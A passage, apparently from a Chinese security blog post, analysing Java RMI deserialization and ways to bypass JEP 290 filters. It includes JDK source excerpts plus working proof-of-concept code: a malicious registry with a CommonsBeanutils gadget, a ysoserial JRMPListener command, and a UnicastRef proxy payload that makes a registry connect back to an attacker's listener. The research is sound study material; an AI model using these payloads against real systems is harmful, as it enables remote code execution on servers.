+        objOut.writeLong(-669196253586618813L);
+        
+        objOut.writeObject(payloadObject);
+
+        os.flush();
+    &#125;
+    finally &#123;
+        if ( dos != null ) &#123;
+            dos.close();
+        &#125;
+        if ( s != null ) &#123;
+            s.close();
+        &#125;
+    &#125;
+</code></pre>
+<h2 id="JEP290详解与绕过"><a href="#JEP290详解与绕过" class="headerlink" title="JEP290详解与绕过"></a>JEP290详解与绕过</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>EP290 是 Java 底层为了缓解反序列化攻击提出的一种解决方案，描述网址<a target="_blank" rel="noopener" href="https://openjdk.java.net/jeps/290">点这里</a>。这是一个针对 JAVA 9 提出的安全特性，但同时对 JDK 6,7,8 都进行了支持，在 JDK 6u141、JDK 7u131、JDK 8u121 版本进行了更新。</p>
+<p>JEP 290 主要提供了几个机制：</p>
+<ul>
+<li>提供了一种灵活的机制，将可反序列化的类从任意类限制为上下文相关的类（黑白名单）；</li>
+<li>限制反序列化的调用深度和复杂度；</li>
+<li>为 RMI export 的对象设置了验证机制；</li>
+<li>提供一个全局过滤器，可以在 properties 或配置文件中进行配置。</li>
+</ul>
+<p>白名单如下：</p>
+<pre><code>java.rmi.Remote
+java.lang.Number
+java.lang.reflect.Proxy
+java.rmi.server.UnicastRef
+java.rmi.activation.ActivationId
+java.rmi.server.UID
+java.rmi.server.RMIClientSocketFactory
+java.rmi.server.RMIServerSocketFactory
+</code></pre>
+<p>原理：<br>server端在反序列化前会调用serialfilter来检查info，而这个serialfilter是通过UnicastServerRef#unmarshalCustomCallData用UnicastServerRef.this.filter设置的</p>
+<pre><code>protected void unmarshalCustomCallData(ObjectInput var1) throws IOException, ClassNotFoundException &#123;
+    if (this.filter != null &amp;&amp; var1 instanceof ObjectInputStream) &#123;
+        final ObjectInputStream var2 = (ObjectInputStream)var1;
+        AccessController.doPrivileged(new PrivilegedAction&lt;Void&gt;() &#123;
+            public Void run() &#123;
+                Config.setObjectInputFilter(var2, UnicastServerRef.this.filter);
+                return null;
+            &#125;
+        &#125;);
+    &#125;
+
+&#125;
+</code></pre>
+<p>UnicastServerRef.this.filter是在实例化RegistryImpl时，</p>
+<pre><code>new UnicastServerRef(var1x, (var0) -&gt; &#123;
+                        return RegistryImpl.registryFilter(var0);
+                    &#125;)
+</code></pre>
+<p>中有个方法应用RegistryImpl::registryFilter，当调用ObjectInputFilter接口checkInput时，相当于</p>
+<pre><code>return RegistryImpl.registryFilter(FilterInfo var1);
+</code></pre>
+<p>跟进registryFilter就是我们上述的白名单过滤</p>
+<pre><code>private static ObjectInputFilter.Status registryFilter(ObjectInputFilter.FilterInfo var0) &#123;
+    if (registryFilter != null) &#123;
+        ObjectInputFilter.Status var1 = registryFilter.checkInput(var0);
+        if (var1 != Status.UNDECIDED) &#123;
+            return var1;
+        &#125;
+    &#125;
+
+    if (var0.depth() &gt; (long)REGISTRY_MAX_DEPTH) &#123;
+        return Status.REJECTED;
+    &#125; else &#123;
+        Class var2 = var0.serialClass();
+        if (var2 == null) &#123;
+            return Status.UNDECIDED;
+        &#125; else &#123;
+            if (var2.isArray()) &#123;
+                if (var0.arrayLength() &gt;= 0L &amp;&amp; var0.arrayLength() &gt; (long)REGISTRY_MAX_ARRAY_SIZE) &#123;
+                    return Status.REJECTED;
+                &#125;
+
+                do &#123;
+                    var2 = var2.getComponentType();
+                &#125; while(var2.isArray());
+            &#125;
+
+            if (var2.isPrimitive()) &#123;
+                return Status.ALLOWED;
+            &#125; else &#123;
+                return String.class != var2 &amp;&amp; !Number.class.isAssignableFrom(var2) &amp;&amp; !Remote.class.isAssignableFrom(var2) &amp;&amp; !Proxy.class.isAssignableFrom(var2) &amp;&amp; !UnicastRef.class.isAssignableFrom(var2) &amp;&amp; !RMIClientSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !RMIServerSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !ActivationID.class.isAssignableFrom(var2) &amp;&amp; !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;
+            &#125;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<h3 id="Object参数方法绕过"><a href="#Object参数方法绕过" class="headerlink" title="Object参数方法绕过"></a>Object参数方法绕过</h3><p>如果服务端”绑定”了一个对象，他的方法参数类型是Object 类型的方法时，则可以绕过 JEP 290。</p>
+<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>我们知道，Registry端在实例化UnicastServerRef 对象的时候会传入<code>RegistryImpl.registryFilter</code>过滤器。</p>
+<p><img src="/images/20230429222815.png"></p>
+<p>但是，初始化普通对象<code>RemoteInterfaceImpl remote = new RemoteInterfaceImpl();</code>的时候不会</p>
+<p>我们跟进实例化的过程，这个我们自定义的类会继承<code>UnicastRemoteObject</code>实例化的时候调用父类的构造器</p>
+<p><img src="/images/20230429222941.png"></p>
+<p>父类构造器中调用参数为port的有参构造器</p>
+<p><img src="/images/20230429223024.png"></p>
+<p>调用exportObject进行初始化</p>
+<p><img src="/images/20230429223101.png"></p>
+<p>发现实例化<code>UnicastServerRef</code>的时候没有传入filter</p>
+<p><img src="/images/20230429223140.png"></p>
+<p><img src="/images/20230429223239.png"></p>
+<p>封装Target的时候skel为空，filter为空</p>
+<p>服务端处理请求：<br>来到Transport#serviceCall，首先从输入流中读取 id , 匹配到 RegistryImpl 对象对应的 Target ，然后取出Target中的UnicastServerRef，调用dispatch。</p>
+<pre><code>try &#123;
+    var39 = ObjID.read(var1.getInputStream());
+&#125; catch (IOException var33) &#123;
+    throw new MarshalException(&quot;unable to read objID&quot;, var33);
+&#125;
+
+Transport var40 = var39.equals(dgcID) ? null : this;
+Target var5 = ObjectTable.getTarget(new ObjectEndpoint(var39, var40));
+
+final Dispatcher var6 = var5.getDispatcher();
+
+try &#123;
+        AccessController.doPrivileged(new PrivilegedExceptionAction&lt;Void&gt;() &#123;
+            public Void run() throws IOException &#123;
+                Transport.this.checkAcceptPermission(var7);
+                var6.dispatch(var37, var1);
+                return null;
+            &#125;
+        &#125;, var7);
+        return true;
+    &#125; catch (PrivilegedActionException var31) &#123;
+        throw (IOException)var31.getException();
+    &#125;
+</code></pre>
+<p>因为skel为空，不会调用<code>this.oldDispatch(var1, var2, var3)</code>,接着会匹配到方法，拿到方法的参数，接着进行反序列化</p>
+<p><img src="/images/20230429225014.png"></p>
+<p>unmarshalCustomCallData方法会因为filter为空返回</p>
+<pre><code>protected void unmarshalCustomCallData(ObjectInput var1) throws IOException, ClassNotFoundException &#123;
+        if (this.filter != null &amp;&amp; var1 instanceof ObjectInputStream) &#123;
+            final ObjectInputStream var2 = (ObjectInputStream)var1;
+            AccessController.doPrivileged(new PrivilegedAction&lt;Void&gt;() &#123;
+                public Void run() &#123;
+                    Config.setObjectInputFilter(var2, UnicastServerRef.this.filter);
+                    return null;
+                &#125;
+            &#125;);
+        &#125;
+
+    &#125;
+</code></pre>
+<p>unmarshalParameters方法中会调用unmarshalValue进行反序列化，高版本会判断是否为String类型</p>
+<pre><code>if (var0.isPrimitive()) &#123;
+    ...
+&#125; else &#123;
+    return var0 == String.class &amp;&amp; var1 instanceof ObjectInputStream ? SharedSecrets.getJavaObjectInputStreamReadString().readString((ObjectInputStream)var1) : var1.readObject();
+&#125;
+
+执行var1.readObject反序列化
+</code></pre>
+<h4 id="反制"><a href="#反制" class="headerlink" title="反制"></a>反制</h4><p>创建恶意的服务端</p>
+<pre><code>Registry registry = LocateRegistry.createRegistry(1099);
+CommonsBeanutils1 cb = new CommonsBeanutils1();
+Object payload = cb.getObject(&quot;calc&quot;);
+Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(&quot;1azy&quot;, payload), Remote.class);
+registry.bind(&quot;test&quot;,new RemoteInterfaceImpl());
+registry.bind(&quot;remote&quot;,remote);
+</code></pre>
+<p>当客户端调用lookup()来攻击服务端时，客户端会对var4进行反序列化，并且这个var4的serialfilter为空</p>
+<p><img src="/images/20230429232356.png"></p>
+<h3 id="利用JRMP反序列化绕过JEP290"><a href="#利用JRMP反序列化绕过JEP290" class="headerlink" title="利用JRMP反序列化绕过JEP290"></a>利用JRMP反序列化绕过JEP290</h3><h4 id="前置知识-x2F-原理"><a href="#前置知识-x2F-原理" class="headerlink" title="前置知识&#x2F;原理"></a>前置知识&#x2F;原理</h4><p>我们首先看到DGC客户端与DGC服务端通信<code>sun.rmi.transport.DGCImpl_Stub#dirty</code>，dirty方法通过<code>super.ref.invoke(var5);</code>进入<code>UnicastRef#invoke(java.rmi.server.RemoteCall)</code>来处理服务端返回的请求</p>
+<pre><code>public Lease dirty(ObjID[] var1, long var2, Lease var4) throws RemoteException &#123;
+    try &#123;
+        //开启了一个连接，似曾相识的 669196253586618813L 在服务端也有
+        RemoteCall var5 = super.ref.newCall(this, operations, 1, -669196253586618813L);
+
+        try &#123;
+            //获取连接的输入流
+            ObjectOutput var6 = var5.getOutputStream();
+            //***DGC客户端攻击DGC服务端的payload写入处***
+            var6.writeObject(var1);
+            var6.writeLong(var2);
+            var6.writeObject(var4);
+        &#125; catch (IOException var20) &#123;
+            throw new MarshalException(&quot;error marshalling arguments&quot;, var20);
+        &#125;
+        //进入此处
+        super.ref.invoke(var5);
+</code></pre>
+<p>invoke方法中会调用executeCall方法</p>
+<pre><code>public void invoke(RemoteCall call) throws Exception &#123;
+        try &#123;
+            clientRefLog.log(Log.VERBOSE, &quot;execute call&quot;);
+
+            call.executeCall();
+</code></pre>
+<p>客户端会根据returnType进入相应的case，当这个returnType标识为报错信息的时候，则会反序列化报错返回，</p>
+<pre><code>public void executeCall() throws Exception &#123;
+byte returnType;
+
+// read result header
+DGCAckHandler ackHandler = null;
+try &#123;
+    ...
+    returnType = in.readByte();
+    in.readID();        // id for DGC acknowledgement
+&#125; catch (UnmarshalException e) &#123;
+    ...
+&#125;
+
+// read return value
+switch (returnType) &#123;
+case TransportConstants.NormalReturn:
+    break;
+
+case TransportConstants.ExceptionalReturn:
+    Object ex;
+    try &#123;
+        ex = in.readObject();
+    &#125; catch (Exception e) &#123;
+        throw new UnmarshalException(&quot;Error unmarshaling return&quot;, e);
+    &#125;
+</code></pre>
+<p>那我们知道了JRMP客户端存在一个反序列化点，是可以被攻击，再来看看对应的服务端是在哪里插入payload的</p>
+<blockquote>
+<p>yso exploit的JRMPlistener攻击代码直接重构了JRMP服务端，把报错信息改成payload的，但是都没有说原生服务端在哪里写序列化。</p>
+</blockquote>
+<p>全局搜索<code>TransportConstants.Exceptional</code>找到<code>sun.rmi.transport.StreamRemoteCall#getResultStream</code></p>
+<pre><code>public ObjectOutput getResultStream(boolean success) throws IOException &#123;
+    /* make sure result code only marshaled once. */
+    if (resultStarted)
+        throw new StreamCorruptedException(&quot;result already in progress&quot;);
+    else
+        resultStarted = true;
+
+    // write out return header
+    // return header, part 1 (read by Transport)
+    DataOutputStream wr = new DataOutputStream(conn.getOutputStream());
+    wr.writeByte(TransportConstants.Return);// transport op
+    getOutputStream(true);  // creates a MarshalOutputStream
+    // return header, part 2 (read by client-side RemoteCall)
+    if (success)            //
+        out.writeByte(TransportConstants.NormalReturn);
+    else
+        out.writeByte(TransportConstants.ExceptionalReturn);
+    out.writeID();          // write id for gcAck
+    return out;
+&#125;
+</code></pre>
+<p>根据传入的boolean，为false就会<code>out.writeByte(TransportConstants.ExceptionalReturn);</code>，我们看看谁调用了这个方法</p>
+<p><img src="/images/20230430142407.png"></p>
+<p><code>sun.rmi.server.UnicastServerRef#dispatch</code>和<code>sun.rmi.server.UnicastServerRef#oldDispatch</code>中，但代码一样，写入了报错信息：</p>
+<pre><code>catch (Throwable e) &#123;
+    logCallException(e);
+    ObjectOutput out = call.getResultStream(false);
+    if (e instanceof Error) &#123;
+            e = new ServerError(
+                &quot;Error occurred in server thread&quot;, (Error) e);
+        &#125; else if (e instanceof RemoteException) &#123;
+            e = new ServerException(
+                &quot;RemoteException occurred in server thread&quot;,
+                (Exception) e);
+        &#125;
+</code></pre>
+<p>后一处在<code>sun.rmi.transport.Transport#serviceCall</code>中，清空了调用栈，然后写入了报错信息。</p>
+<pre><code>try &#123;
+    ObjectOutput out = call.getResultStream(false);
+    UnicastServerRef.clearStackTraces(e);
+    out.writeObject(e);
+    call.releaseOutputStream();
+
+&#125; catch (IOException ie) &#123;
+</code></pre>
+<p>服务端的这三处就可以写入payload去发起对于客户端的请求，但是我们发现无法利用原生的参数来发起请求，因为他们都是报错信息。<br>所以需要我们构造一个服务端，来发送给JRMP客户端一个序列化数据，这就是YSOSERIAL-exploit-JRMPListener做的事情。</p>
+<h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>JRMP服务端 </p>
+<pre><code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 &quot;calc&quot;
+</code></pre>
+<p>JRMP客户端</p>
+<pre><code>Registry registry_remote = LocateRegistry.getRegistry(&quot;localhost&quot;, 1099);
+registry_remote.lookup(&quot;remote&quot;);
+</code></pre>
+<p>JDK8u121是可以复现的，<strong>JRMP服务端打JRMP客户端的攻击方法不受JEP290的限制</strong></p>
+<p><img src="/images/20230430144001.png"></p>
+<p>原因：</p>
+<blockquote>
+<p>JEP290默认只为RMI注册表（RMI Register层）和RMI分布式垃圾收集器（DGC层）提供了相应的内置过滤器，但是最底层的JRMP是没有做过滤器的。</p>
+</blockquote>
+<h4 id="与RMI服务端反序列化攻击RMI注册端-Bind结合"><a href="#与RMI服务端反序列化攻击RMI注册端-Bind结合" class="headerlink" title="与RMI服务端反序列化攻击RMI注册端-Bind结合"></a>与RMI服务端反序列化攻击RMI注册端-Bind结合</h4><p>JRMP服务端打JRMP客户端:</p>
+<ol>
+<li>要RMI注册端作为JRMP客户端去主动连接我们的JRMP服务端（白名单过滤器只对反序列化过程有效，对序列化过程无效）</li>
+<li>我们恶意的JRMP服务端在原本是报错信息的位置写入利用链，序列化成数据包返回到JRMP客户端（RMI注册端）。</li>
+<li>由于JRMP客户端的反序列化过程不存在JEP290的过滤器，所以我们的payload可以成功被执行，从而完成RCE。</li>
+</ol>
+<p>这个攻击组合中<strong>唯一缺失的板块</strong>就是：让原本目标是直接命令执行的第一条bind攻击，转换目标成<strong>让RMI注册端去作为JRMP客户端向我们指定的JRMP服务端去发起请求</strong>，从而完成一整个攻击链的衔接，这需要我们去寻<strong>找一个所有对象都在白名单中的Gadget</strong>去完成这一任务。</p>
+<p>目标：</p>
+<ol>
+<li>我们要找一个Gadget，它在服务端的反序列化的过程中，会对我们指定的JRMP服务器发起JRMP连接。</li>
+<li>在找到这个Gadget之后，我们需要进一步将它封装进入<code>register.bind(String,Remote)</code>中。（为了满足客户端的格式需求）</li>
+</ol>
+<p>找Gadget：</p>
+<h5 id="UnicastRef对象"><a href="#UnicastRef对象" class="headerlink" title="UnicastRef对象"></a>UnicastRef对象</h5><p>首先我们要知道反序列化的入口不止<code>readObject</code>还有<code>readExternal</code></p>
+<p>来到sun.rmi.server.UnicastRef#readExternal:</p>
+<pre><code>public void readExternal(ObjectInput in)
+        throws IOException, ClassNotFoundException
+    &#123;
+        ref = LiveRef.read(in, false);//---进入此处----
+    &#125;
+</code></pre>
+<p><code>sun.rmi.transport.LiveRef#read</code>：</p>
+<pre><code>public static LiveRef read(ObjectInput in, boolean useNewFormat)
+        throws IOException, ClassNotFoundException
+    &#123;
+        Endpoint ep;
+        ObjID id;
+
+        // 从输入流中读取endpoint, id和result flag
+        // 一个固定的格式版本判断，根据JDK版本有关
+        if (useNewFormat) &#123;
+            ep = TCPEndpoint.read(in);
+        &#125; else &#123;
+            //读取
+            ep = TCPEndpoint.readHostPortFormat(in);
+        &#125;
+        id = ObjID.read(in);
+        boolean isResultStream = in.readBoolean();
+        //恢复一个LiveRef对象(可以理解为一个连接对象)
+        //此处可以由我们的序列化对象进行指定。
+        LiveRef ref = new LiveRef(id, ep, false);
+        //判断输入流in是不是已经是一个对象流了，这里都会为true
+        if (in instanceof ConnectionInputStream) &#123;
+            ConnectionInputStream stream = (ConnectionInputStream)in;
+            // 保存ref以在所有参数/返回都被解析后再发送&quot;dirty&quot;调用。
+            stream.saveRef(ref);
+            if (isResultStream) &#123;
+                stream.setAckNeeded();
+            &#125;
+        &#125; else &#123;
+            //-----这里会产生一个误区，实际上我们进入的不是这个registerRefs----
+            DGCClient.registerRefs(ep, Arrays.asList(new LiveRef[] &#123; ref &#125;));
+        &#125;
+
+        return ref;
+    &#125;
+</code></pre>
+<p>进入<code>stream.saveRef(ref);</code>中，将ref填入流中的<code>incomingRefTable</code>这个Map中</p>
+<pre><code>void saveRef(LiveRef ref) &#123;
+    Endpoint ep = ref.getEndpoint();
+
+    // check whether endpoint is already in the hashtable
+    List&lt;LiveRef&gt; refList = incomingRefTable.get(ep);
+
+    if (refList == null) &#123;
+        refList = new ArrayList&lt;LiveRef&gt;();
+        incomingRefTable.put(ep, refList);
+    &#125;
+
+    // add ref to list of refs for endpoint ep
+    refList.add(ref);
+&#125;
+</code></pre>
+<p>至此，<strong>ref填入完成</strong>，反序列化执行完毕，我们来到反序列化点<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>中的case0，</p>
+<pre><code>case 0:
+    try &#123;
+        var11 = var2.getInputStream();
+        var7 = (String)var11.readObject();
+        //payload在这，在readobject中递归调用属性，进入UnicastRef#readExternal
+        var8 = (Remote)var11.readObject();
+    &#125; catch (IOException var94) &#123;
+        throw new UnmarshalException(&quot;error unmarshalling arguments&quot;, var94);
+    &#125; catch (ClassNotFoundException var95) &#123;
+        throw new UnmarshalException(&quot;error unmarshalling arguments&quot;, var95);
+    &#125; finally &#123;
+        //在这里处理ref的时候才真正完成了触发
+        var2.releaseInputStream();
+    &#125;
+
+    var6.bind(var7, var8);
+</code></pre>
+<p>在<code>var2.releaseInputStream();</code>会对我们填入的ref进行处理，我们更跟进</p>
+<pre><code>public void releaseInputStream() throws IOException &#123;
+    /* WARNING: Currently, the UnicastRef.java invoke methods rely
+     * upon this method not throwing an IOException.
+     */
+
+    try &#123;
+        ...
+        //统一处理去DGC注册之前readobject解析出来的ref
+        in.registerRefs();
+        in.done(conn);
+        &#125;
+        conn.releaseInputStream();
+    &#125; finally &#123;
+        in = null;
+    &#125;
+</code></pre>
+<p><code>sun.rmi.transport.ConnectionInputStream#registerRefs:</code>从之前readobject语句解析出来的<code>incomingRefTable</code>中读取ref。</p>
+<pre><code>void registerRefs() throws IOException &#123;
+    if (!incomingRefTable.isEmpty()) &#123;
+        for (Map.Entry&lt;Endpoint, List&lt;LiveRef&gt;&gt; entry :
+                 incomingRefTable.entrySet()) &#123;
+            DGCClient.registerRefs(entry.getKey(), entry.getValue());
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p><code>sun.rmi.transport.DGCClient#registerRefs</code>：</p>
+<pre><code>static void registerRefs(Endpoint ep, List&lt;LiveRef&gt; refs) &#123;
+    /*
+     * Look up the given endpoint and register the refs with it.
+     * The retrieved entry may get removed from the global endpoint
+     * table before EndpointEntry.registerRefs() is able to acquire
+     * its lock; in this event, it returns false, and we loop and
+     * try again.
+     */
+    EndpointEntry epEntry;
+    do &#123;
+        epEntry = EndpointEntry.lookup(ep);
+    &#125; while (!epEntry.registerRefs(refs));
+&#125;
+</code></pre>
+<p>un.rmi.transport.DGCClient.EndpointEntry#registerRefs:</p>
+<pre><code>public boolean registerRefs(List&lt;LiveRef&gt; refs) &#123;
+            assert !Thread.holdsLock(this);
+
+            Set&lt;RefEntry&gt; refsToDirty = null;     // entries for refs needing dirty
+            long sequenceNum;           // sequence number for dirty call
+            //阻塞执行，去遍历查询LiveRef实例
+            synchronized (this) &#123;
+                //省略此处代码，就是做遍历查询的事情
+            &#125;
+            //为所有结果参与DGC垃圾回收机制注册
+            //------进入此处------
+            makeDirtyCall(refsToDirty, sequenceNum);
+            return true;
+        &#125;
+</code></pre>
+<p><code>sun.rmi.transport.DGCClient.EndpointEntry#makeDirtyCall</code>:(这里会发出DGC客户端的dirty请求)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">private void makeDirtyCall(Set&lt;RefEntry&gt; refEntries, long sequenceNum) &#123;</span><br><span class="line">            assert !Thread.holdsLock(this);</span><br><span class="line">            //根据refEntries得到注册用的ids</span><br><span class="line">            ObjID[] ids;</span><br><span class="line">            if (refEntries != null) &#123;</span><br><span class="line">                ids = createObjIDArray(refEntries);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                ids = emptyObjIDArray;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            long startTime = System.currentTimeMillis();</span><br><span class="line">            try &#123;</span><br><span class="line">                //进入此处，进行dirty请求</span><br><span class="line">                Lease lease =</span><br><span class="line">                    dgc.dirty(ids, sequenceNum, new Lease(vmid, leaseValue));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>进入<code>sun.rmi.transport.DGCImpl_Stub#dirty</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public Lease dirty(ObjID[] var1, long var2, Lease var4) throws RemoteException &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            RemoteCall var5 = super.ref.newCall(this, operations, 1, -669196253586618813L);</span><br><span class="line"></span><br><span class="line">            try &#123;</span><br><span class="line">                ObjectOutput var6 = var5.getOutputStream();</span><br><span class="line">                var6.writeObject(var1);</span><br><span class="line">                var6.writeLong(var2);</span><br><span class="line">                var6.writeObject(var4);</span><br><span class="line">            &#125; catch (IOException var20) &#123;</span><br><span class="line">                throw new MarshalException(&quot;error marshalling arguments&quot;, var20);</span><br><span class="line">            &#125;</span><br><span class="line">            //JRMP服务端打JRMP客户端的反序列化触发点在这里面</span><br><span class="line">            super.ref.invoke(var5);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里就是JRMP服务端打JRMP客户端，JRMP客户端的漏洞触发点。</p>
+<p>知道服务端反序列化处的触发流程之后，我们来看payload的构造。</p>
+<p>一个基础的可以指定连接目标的UnicastRef对象：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//让受害者主动去连接的攻击者的JRMPlister的host和port</span><br><span class="line">public static UnicastRef generateUnicastRef(String host, int port) &#123;</span><br><span class="line">    java.rmi.server.ObjID objId = new java.rmi.server.ObjID();</span><br><span class="line">    sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(host, port);</span><br><span class="line">    sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objId, endpoint, false);</span><br><span class="line">    return new sun.rmi.server.UnicastRef(liveRef);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>如何让这个对象反序列化呢？</strong> 还需要进一步的封装。</p>
+<p>我们的目标是：将UnicastRef对象封装进入<code>register.bind(String,Remote)</code>的Remote参数中，从而在反序列化Remote参数的时候因为反序列化的递归的特性，进行UnicastRef对象的反序列化。那又回归到了前面讨论过的问题，如何将UnicastRef对象封装成Remote类型：</p>
+<ol>
+<li><p>压根不封装，跟Barmie工具一样自实现通讯协议，直接发送UnicastRef（因为其实只有客户端上层函数需要remote类型的输入，服务端并没有要求是remote类型，都会反序列化）</p>
+</li>
+<li><p>跟RMIRegisterExploit一样，使用<strong>动态代理</strong>来实现封装</p>
+</li>
+<li><p>找一个同时继承实现两者的类或者一个实现Remote，并将UnicastRef类型作为其一个字段的类。这样只需要把我们的UnicastRef对象塞入这个类中，然后直接塞进<code>register.bind(String,Remote)</code>中就可以了。</p>
+</li>
+</ol>
+<h5 id="1-绕过客户端-自实现协议"><a href="#1-绕过客户端-自实现协议" class="headerlink" title="1.绕过客户端-自实现协议"></a>1.绕过客户端-自实现协议</h5><h5 id="2-动态代理-自定义"><a href="#2-动态代理-自定义" class="headerlink" title="2.动态代理-自定义"></a>2.动态代理-自定义</h5><p>代码参考github-Bypass290_proxy.java</p>
+<p>我们自定义一个PocHandler拦截器：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public static class PocHandler implements InvocationHandler, Serializable &#123;</span><br><span class="line">    private RemoteRef ref;//来放我们的UnicastRef对象</span><br><span class="line"></span><br><span class="line">    protected PocHandler(RemoteRef newref) &#123;//构造方法，来引入UnicastRef</span><br><span class="line">        ref = newref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;</span><br><span class="line">        return this.ref //只是为了满足拦截类的格式，随便写</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>把生成UnicastRef放入PocHandler拦截器，然后转变为Remote类型。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        String jrmpListenerHost = &quot;127.0.0.1&quot;;</span><br><span class="line">        int jrmpListenerPort = 1199;</span><br><span class="line">        UnicastRef unicastRef = generateUnicastRef(jrmpListenerHost, jrmpListenerPort);</span><br><span class="line">        Remote remote = (Remote) Proxy.newProxyInstance(RemoteRef.class.getClassLoader(), new Class&lt;?&gt;[]&#123;Remote.class&#125;, new PocHandler(unicastRef));</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(1099);//本地测试</span><br><span class="line">        registry.bind(&quot;2333&quot;, remote);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h5 id="2-动态代理-RemoteObjectInvocationHandler（Ysoserial-Payload-JRMPClient）"><a href="#2-动态代理-RemoteObjectInvocationHandler（Ysoserial-Payload-JRMPClient）" class="headerlink" title="2.动态代理-RemoteObjectInvocationHandler（Ysoserial-Payload-JRMPClient）"></a>2.动态代理-RemoteObjectInvocationHandler（Ysoserial-Payload-JRMPClient）</h5><blockquote>
+<p>这其实就是Ysoserial-Payload-JRMPClient模块生成的payload的实现逻辑</p>
+</blockquote>
+<p>假如不自定义一个拦截器，去jdk环境中寻找也是可以找到的——<strong>RemoteObjectInvocationHandler</strong></p>
+<ol>
+<li>它可以填入一个UnicastRef对象（这表示我们的payload可以塞进去）</li>
+<li>同时是一个 拦截器。（这表示我们可以通过动态代理把他改成任意的接口）</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public class RemoteObjectInvocationHandler</span><br><span class="line">    extends RemoteObject</span><br><span class="line">    implements InvocationHandler //表示是一个拦截器</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//构造函数，传入一个RemoteRef接口类型的变量</span><br><span class="line">    public RemoteObjectInvocationHandler(RemoteRef ref) &#123;</span><br><span class="line">        super(ref);</span><br><span class="line">        if (ref == null) &#123;</span><br><span class="line">            throw new NullPointerException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">//而UnicastRef类型实现RemoteRef接口，即可以传入</span><br><span class="line">//public class UnicastRef implements RemoteRef &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>super(ref);</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public abstract class RemoteObject implements Remote, java.io.Serializable &#123;</span><br><span class="line"></span><br><span class="line">    /** The object&#x27;s remote reference. */</span><br><span class="line">    transient protected RemoteRef ref;</span><br><span class="line"></span><br><span class="line"> //super(ref)的内容，可以成功塞入变量中</span><br><span class="line">     protected RemoteObject(RemoteRef newref) &#123;</span><br><span class="line">        ref = newref;</span><br><span class="line">    &#125;</span><br><span 